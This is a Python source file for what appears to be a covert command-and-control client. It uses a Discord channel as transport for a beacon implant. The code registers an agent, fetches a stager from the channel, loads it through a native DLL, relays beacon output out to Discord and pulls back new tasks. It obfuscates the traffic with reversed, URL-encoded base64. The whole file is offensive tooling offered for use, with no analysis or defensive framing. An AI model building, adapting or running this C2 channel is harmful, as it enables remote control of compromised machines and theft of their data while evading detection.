import discord
import sys
import base64
import urllib
from time import sleep
from ctypes import *
from ctypes.wintypes import *
import uuid

# Discord bot token
DISCORD_TOKEN = 'YOUR_DISCORD_BOT_TOKEN'
CHANNEL_ID = 123456789012345678  # Replace with your Discord channel ID

beaconId = str(uuid.uuid4())
taskKeyName = beaconId + ':TaskForYou'
respKeyName = beaconId + ':RespForYou'

# Initialize Discord client
client = discord.Client(intents=discord.Intents.default())

#####################
# Encoder functions #
#####################

def encode(data):
    data = base64.b64encode(data)
    return urllib.parse.quote_plus(data)[::-1]

def decode(data):
    data = urllib.parse.unquote(data[::-1])
    return base64.b64decode(data)

#####################
# Transport functions #
#####################

async def prepTransport():
    await client.wait_until_ready()
    return 0

async def sendData(data):
    """
    Function to send data to the external C2. Data must be encoded
    before transmission.
    """
    channel = client.get_channel(CHANNEL_ID)
    encoded_data = encode(data)
    await channel.send(f'{respKeyName}: {encoded_data}')
    print(f'Sent {len(data)} bytes to Discord.')

async def recvData():
    """
    Function to receive data from the external C2.
    Decodes data received from Discord channel messages.
    """
    channel = client.get_channel(CHANNEL_ID)
    while True:
        async for message in channel.history(limit=10):
            if taskKeyName in message.content:
                task_msg = message.content.split(': ')[1]
                decoded_data = decode(task_msg.encode())
                await message.delete()
                return [decoded_data]
        sleep(5)

async def registerClient():
    """
    Function to register a new beacon with the C2.
    """
    channel = client.get_channel(CHANNEL_ID)
    keyName = f"AGENT:{beaconId}"
    await channel.send(f'[+] Registering new agent {keyName}')
    print(f"[+] Registered new agent {keyName}")

#####################
# Interaction logic #
#####################

maxlen = 1024 * 1024

lib = CDLL('c2file.dll')

lib.start_beacon.argtypes = [c_char_p, c_int]
lib.start_beacon.restype = POINTER(HANDLE)
def start_beacon(payload):
    return lib.start_beacon(payload, len(payload))

lib.read_frame.argtypes = [POINTER(HANDLE), c_char_p, c_int]
lib.read_frame.restype = c_int
def ReadPipe(hPipe):
    mem = create_string_buffer(maxlen)
    l = lib.read_frame(hPipe, mem, maxlen)
    if l < 0:
        return -1
    chunk = mem.raw[:l]
    return chunk

lib.write_frame.argtypes = [POINTER(HANDLE), c_char_p, c_int]
lib.write_frame.restype = c_int
def WritePipe(hPipe, chunk):
    sys.stdout.write(f'wp: {len(chunk)}\n')
    sys.stdout.flush()
    ret = lib.write_frame(hPipe, c_char_p(chunk), c_int(len(chunk)))
    sleep(3)
    print(f"ret={ret}")
    return ret

async def go():
    # Register beaconId so C2 server knows we're waiting
    await registerClient()
    print("Waiting for stager...")  # DEBUG
    p = await recvData()
    p = p[0]
    print("Got a stager! loading...")
    sleep(2)
    handle_beacon = start_beacon(p)
    print("Loaded, and got handle to beacon. Getting METADATA.")
    return handle_beacon

async def interact(handle_beacon):
    while True:
        sleep(1.5)
        chunk = ReadPipe(handle_beacon)
        if chunk < 0:
            print(f'readpipe {len(chunk)}')
            break
        else:
            print(f"Received {len(chunk)} bytes from pipe")
        print("Relaying chunk to server")
        await sendData(chunk)

        print("Checking for new tasks from transport")
        newTasks = await recvData()
        for newTask in newTasks:
            print(f"Got new task: {newTask}")
            print(f"Writing {len(newTask)} bytes to pipe")
            r = WritePipe(handle_beacon, newTask)
            print(f"Write {r} bytes to pipe")

# Prepare the transport module and start the bot
@client.event
async def on_ready():
    print(f'Logged in as {client.user}')
    handle_beacon = await go()
    try:
        await interact(handle_beacon)
    except KeyboardInterrupt:
        print("Caught escape signal")
        sys.exit(0)

client.run(DISCORD_TOKEN)
